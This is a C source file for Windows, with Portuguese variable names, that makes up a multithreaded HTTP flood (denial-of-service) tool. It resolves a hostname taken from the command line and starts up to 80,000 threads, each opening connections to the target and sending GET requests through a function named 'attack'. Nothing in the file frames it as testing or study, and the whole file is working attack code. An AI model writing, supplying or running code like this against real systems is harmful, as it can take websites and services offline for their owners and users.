#include <stdio.h>
#include <stdlib.h>
#include <winsock2.h>
#include <windows.h>
#include <pthread.h>
#include <time.h>

#define MAXTH 80000

pthread_t threads[MAXTH];

typedef struct sockaddr SADDR;

struct alvo
{
	char *dom;
	char *host;
	int porta;
};
typedef struct alvo PARAMS;

void *attack(void *arg)
{
	WSADATA ws;
	WSAStartup(MAKEWORD(2, 2), &ws);

	PARAMS *av1 = (struct alvo *) arg;

	char *host = (char *) av1->host;
	char *dom = (char *) av1->dom;
	int porta = (int) av1->porta;

	char req[200];
	sprintf(req, "GET / HTTP/1.0\r\nHost: %s\r\n\r\n", dom);
	struct sockaddr_in alvo;

	alvo.sin_addr.s_addr = inet_addr(host);
	alvo.sin_family = AF_INET;
	alvo.sin_port = htons(porta);

	int sTest;

	if ((sTest = socket(AF_INET, SOCK_STREAM, 0)) >= 0)
	{
		if (connect(sTest, (SADDR *)&alvo, sizeof(alvo)) >= 0)
		{
			int meusocket = socket(AF_INET, SOCK_STREAM, 0);
			int conecta = connect(meusocket, (SADDR *)&alvo, sizeof(alvo));
			send(meusocket, req, strlen(req), 0);
		}
		else
		{
			printf("Connect Error\n");
		}
	}
	else
	{
		printf("Socket Error\n");
	}
}

int main(int argc, char *argv[])
{
	WSADATA ws;
	WSAStartup(MAKEWORD(2, 2), &ws);

	int i;
	int k = 0;

	PARAMS av;
	struct hostent *h;
	struct in_addr addr;

	h = gethostbyname(argv[1]);
	puts(h->h_name);
	
	while(h->h_addr_list[k] != 0){
		addr.s_addr = *(unsigned long *) h->h_addr_list[k++];
	}
	puts(inet_ntoa(addr));
	av.host = inet_ntoa(addr);
	av.dom = h->h_name;
	av.porta = atoi(argv[2]);
	
	int tN = atoi(argv[3]);

	for (i = 0; i < tN; i++)
	{
		pthread_create(&(threads[i]), NULL, attack, &av);
		printf("Threads %d\n", i);
		Sleep(10);
	}
	
	for (i = 0; i < tN; i++)
	{
		pthread_join(threads[i],NULL);
	}

	return 0;
}
